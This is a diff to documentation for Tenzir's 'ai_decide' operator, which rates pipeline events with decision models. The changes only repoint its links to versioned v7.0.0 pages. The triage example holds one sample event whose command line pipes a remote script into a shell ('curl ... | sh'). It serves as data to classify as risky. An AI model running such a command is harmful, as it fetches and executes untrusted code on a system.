@@ -1,7 +1,7 @@
 ---
 title: "ai_decide"
-canonical: https://tenzir.com/docs/reference/operators/ai_decide
-source: https://tenzir.com/docs/reference/operators/ai_decide.md
+canonical: https://tenzir.com/docs/v7.0.0/reference/operators/ai_decide
+source: https://tenzir.com/docs/v7.0.0/reference/operators/ai_decide.md
 section: "Docs"
 ---
 
@@ -20,7 +20,7 @@ ai_decide [question:string], model=string, endpoint=string,
 
 ## Description
 
-The `ai_decide` operator sends one request per input event to a **decision model**. A decision model doesn’t generate text. It reads the event and answers questions with typed values that a pipeline can filter on directly, such as a probability or one option out of a fixed set. Decisions are cheaper and faster than prompting a large language model, so you can ask them about every event and reserve [`ai_prompt`](https://tenzir.com/docs/reference/operators/ai_prompt.md) for the events that need an explanation.
+The `ai_decide` operator sends one request per input event to a **decision model**. A decision model doesn’t generate text. It reads the event and answers questions with typed values that a pipeline can filter on directly, such as a probability or one option out of a fixed set. Decisions are cheaper and faster than prompting a large language model, so you can ask them about every event and reserve [`ai_prompt`](https://tenzir.com/docs/v7.0.0/reference/operators/ai_prompt.md) for the events that need an explanation.
 
 The operator speaks the System One API, which hosted and self-hosted decision models implement. It appends `/systemone` to the `endpoint` and sends a `POST` request with the model, the questions, and the event under evaluation. For example, hosted Jev from TypeSafe AI uses the endpoint `https://api.typesafe.ai/v1`, and a local [Laya](https://laya.tools) server started with `laya-serve` uses `http://127.0.0.1:8000/v1`.
 
@@ -132,7 +132,7 @@ The `state` argument is the content that the model evaluates. A string is sent a
 
 By default, `state` is the whole event without the `ai` field and without the `into` field. This keeps the results of earlier AI operators out of the request. Pass `state=this` to send the event unchanged. Prefer a small record with only the fields that the question needs: the model reads less, answers faster, and decision models have a limited context.
 
-The operator sends no requests for events that a later [`where`](https://tenzir.com/docs/reference/operators/where.md) drops when the filter doesn’t read the result field, because the filter then runs before the operator. This applies to each condition of a filter that combines conditions with `and`: in `where severity == "high" and ai.decide.answer.score > 0.5`, only the second condition stays after the operator. A filter moves only if every operator between it and `ai_decide` lets it pass. For example, a filter after [`head`](https://tenzir.com/docs/reference/operators/head.md) or [`tail`](https://tenzir.com/docs/reference/operators/tail.md) stays where it is. Likewise, a [`head`](https://tenzir.com/docs/reference/operators/head.md) after the operator lets sources that support limits stop reading early, unless a filter stays between them.
+The operator sends no requests for events that a later [`where`](https://tenzir.com/docs/v7.0.0/reference/operators/where.md) drops when the filter doesn’t read the result field, because the filter then runs before the operator. This applies to each condition of a filter that combines conditions with `and`: in `where severity == "high" and ai.decide.answer.score > 0.5`, only the second condition stays after the operator. A filter moves only if every operator between it and `ai_decide` lets it pass. For example, a filter after [`head`](https://tenzir.com/docs/v7.0.0/reference/operators/head.md) or [`tail`](https://tenzir.com/docs/v7.0.0/reference/operators/tail.md) stays where it is. Likewise, a [`head`](https://tenzir.com/docs/v7.0.0/reference/operators/head.md) after the operator lets sources that support limits stop reading early, unless a filter stays between them.
 
 ### Check questions before the pipeline runs
 
@@ -289,7 +289,7 @@ TLS options for the HTTP client.
 
 ### Triage commands, then explain the risky ones
 
-Rate every command with a cheap decision and send only risky commands to a language model for an explanation. The [`ai_prompt`](https://tenzir.com/docs/reference/operators/ai_prompt.md) operator leaves the `ai` field out of its request, so the model sees only the event:
+Rate every command with a cheap decision and send only risky commands to a language model for an explanation. The [`ai_prompt`](https://tenzir.com/docs/v7.0.0/reference/operators/ai_prompt.md) operator leaves the `ai` field out of its request, so the model sees only the event:
 
 ```tql
 from {process: {cmd_line: "curl -s https://203.0.113.7/x.sh | sh", user: "build"}},
@@ -429,5 +429,5 @@ where ai.decide.answer? == null or ai.decide.answer.probability >= 0.5
 
 ## See Also
 
-* [`ai_prompt`](https://tenzir.com/docs/reference/operators/ai_prompt.md)
+* [`ai_prompt`](https://tenzir.com/docs/v7.0.0/reference/operators/ai_prompt.md)
 * [Enrich events with AI](../../guides/enrich/enrich-events-with-ai.md)
